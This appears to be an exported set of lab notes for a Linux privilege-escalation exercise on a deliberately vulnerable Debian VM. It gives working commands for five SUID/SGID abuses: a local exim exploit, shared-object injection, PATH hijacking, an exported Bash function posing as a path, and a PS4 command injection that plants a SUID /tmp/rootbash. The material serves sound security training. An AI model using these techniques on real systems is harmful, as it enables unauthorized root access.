<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SUID / SGID Executables</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SUID / SGID Executables</h1><br/><p><strong><h1>SUID / SGID Executables</h1></strong></p><p></p><p></p><p></p><p><strong><h2>A) Known Exploits</h2></strong></p><p></p><p>Find all the SUID/SGID executables on the Debian VM:</p><p></p><p><strong>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</strong></p><p></p><p>Note that <strong>/usr/sbin/exim-4.84-3</strong> appears in the results. Try to find a known exploit for this version of exim. <strong>Exploit-DB</strong>, <strong>Google</strong>, and <strong>GitHub</strong> are good places to search!</p><p></p><p>A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at <strong>/home/user/tools/suid/exim/cve-2016-1531.sh</strong>.</p><p></p><p>Run the exploit script to gain a root shell:</p><p></p><p><strong>/home/user/tools/suid/exim/cve-2016-1531.sh</strong></p><p></p><p>Remember to exit out of the root shell before continuing!</p><p></p><p></p><p></p><p><strong><h2>B) Shared Object Injection</h2></strong></p><p></p><p>The <strong>/usr/local/bin/suid-so</strong> SUID executable is <strong>vulnerable</strong> to <strong>shared object injection</strong>.</p><p></p><p>First, <strong>execute</strong> the file and note that currently it displays a progress bar before exiting:</p><p></p><p><strong>/usr/local/bin/suid-so</strong></p><p></p><p>Run <strong>strace</strong> on the file and <strong>search</strong> the output for <strong>open</strong>/<strong>access calls </strong>and for &quot;<strong>no such file</strong>&quot; errors:</p><p></p><p><strong>strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</strong></p><p><strong>Note </strong>that the executable tries to load the <strong>/home/user/.config/libcalc.so</strong> shared object within our home directory, but it cannot be found.</p><p></p><p></p><p>Create the .config directory for the libcalc.so file:</p><p></p><p><strong>mkdir /home/user/.config</strong></p><p>Example shared object code can be found at <strong>/home/user/tools/suid/libcalc.c</strong>. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:</p><p></p><p><strong>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</strong></p><p></p><p>Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.</p><p></p><p><strong>/usr/local/bin/suid-so</strong></p><p></p><p>Remember to exit out of the root shell before continuing!</p><p></p><p></p><p></p><p><strong><h2>C) Environment Variables</h2></strong></p><p></p><p>The<strong> /usr/local/bin/suid-env</strong> executable can be exploited due to it <strong>inheriting</strong> the <strong>user&#39;s PATH</strong> environment variable and attempting to execute programs without specifying an absolute path.</p><p></p><p>First, execute the file and note that it seems to be trying to start the apache2 webserver:</p><p></p><p><strong>/usr/local/bin/suid-env</strong></p><p></p><p>Run strings on the file to look for strings of printable characters:</p><p></p><p><strong>strings /usr/local/bin/suid-env</strong></p><p></p><p>One line (<strong>&quot;service apache2 start&quot;</strong>) suggests that the service executable is being called to start the webserver, however the full path of the executable (<strong>/usr/sbin/service</strong>) is not being used.</p><p></p><p>Compile the code located at <strong>/home/user/tools/suid/service.c</strong> into an executable called <strong>service</strong>. This code simply spawns a Bash shell:</p><p></p><p><strong>gcc -o service /home/user/tools/suid/service.c</strong></p><p></p><p>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:</p><p></p><p><strong>PATH=.:$PATH /usr/local/bin/suid-env</strong></p><p></p><p>Remember to exit out of the root shell before continuing!</p><p></p><p></p><p></p><p><strong><h2>D) Abusing Shell Features (#1)    </h2></strong><h2>                        </h2></p><p></p><p>The <strong>/usr/local/bin/suid-env2</strong> executable is identical to <strong>/usr/local/bin/suid-env</strong> except that it uses the <strong>absolute path</strong> of the <strong>service</strong> executable <strong>(/usr/sbin/service)</strong> to start the apache2 webserver.</p><p></p><p>Verify this with strings:</p><p><strong>strings /usr/local/bin/suid-env2</strong></p><p></p><p>In <strong>Bash versions &lt;4.2-048</strong> it is possible to <strong>define shell functions</strong> with <strong>names that resemble file paths</strong>, then <strong>export</strong> those <strong>functions</strong> so that they are <strong>used instead of any actual executable</strong> at that file path.</p><p></p><p>Verify the version of Bash installed on the Debian VM is less than 4.2-048:</p><p><strong>/bin/bash --version</strong></p><p></p><p>Create a Bash function with the name &quot;<strong>/usr/sbin/service</strong>&quot; that executes a new <strong>Bash shell</strong> (using -p so permissions are preserved) and export the function:</p><p></p><p><strong>function /usr/sbin/service { /bin/bash -p; }</strong></p><p><strong>export -f /usr/sbin/service</strong></p><p></p><p>Run the suid-env2 executable to gain a root shell:</p><p></p><p><strong>/usr/local/bin/suid-env2</strong></p><p></p><p>Remember to exit out of the root shell before continuing!</p><p></p><p></p><p></p><p><strong><h2>E) Abusing Shell Features (#2)</h2></strong></p><p></p><p><strong>Note:</strong> This will not work on <strong>Bash versions 4.4</strong> and above.</p><p></p><p>When in <strong>debugging mode</strong>, Bash uses the <strong>environment</strong> <strong>variable</strong> <strong>PS4</strong> to display an extra prompt for debugging statements.</p><p></p><p>Run the <strong>/usr/local/bin/suid-env2</strong> executable with <strong>bash debugging enabled</strong> and the <strong>PS4 variable</strong> set to an <strong>embedded command </strong>which creates an <strong>SUID version of /bin/bash:</strong></p><p></p><p><strong>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2</strong></p><p></p><p>Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p></p><p><strong>/tmp/rootbash -p</strong></p><p></p><p>Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!</p><p></p><p><strong>rm /tmp/rootbash</strong></p><p><strong>exit</strong></p><p><strong></strong></p><p></p><p><strong><h2>END</h2></strong></p></div>
</body>
</html>
